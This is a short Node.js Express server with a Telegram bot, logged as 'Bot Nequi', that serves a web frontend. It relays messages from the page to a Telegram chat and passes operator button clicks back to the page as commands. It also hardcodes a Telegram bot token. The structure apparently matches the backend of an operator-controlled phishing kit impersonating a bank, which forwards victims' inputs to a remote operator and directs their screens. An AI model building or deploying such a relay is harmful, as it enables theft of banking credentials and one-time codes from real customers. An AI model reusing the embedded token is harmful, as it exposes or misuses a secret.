import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import TelegramBot from 'node-telegram-bot-api';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = process.env.PORT || 3000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Serve static files from dist (Vite build)
app.use(express.static(path.join(__dirname, 'dist')));

let userCommands = {};

// Bot logic
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
console.log("🤖 Iniciando Bot Nequi...");

bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    console.log(`[Telegram] Clic: ${data}, Chat: ${chatId}`);
    userCommands['current'] = data;
    bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
});

bot.on('polling_error', (error) => console.error(`[Polling Error] ${error.code}: ${error.message}`));

// Endpoints
app.get('/check-status', (req, res) => {
    const command = userCommands['current'];
    if (command) {
        res.json({ command: command });
        userCommands['current'] = null;
    } else {
        res.json({ command: null });
    }
});

app.post('/telegram-proxy/sendMessage', async (req, res) => {
    try {
        const { chat_id, text, reply_markup, parse_mode } = req.body;
        await bot.sendMessage(chat_id, text, { reply_markup, parse_mode });
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Catch-all for React Router
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
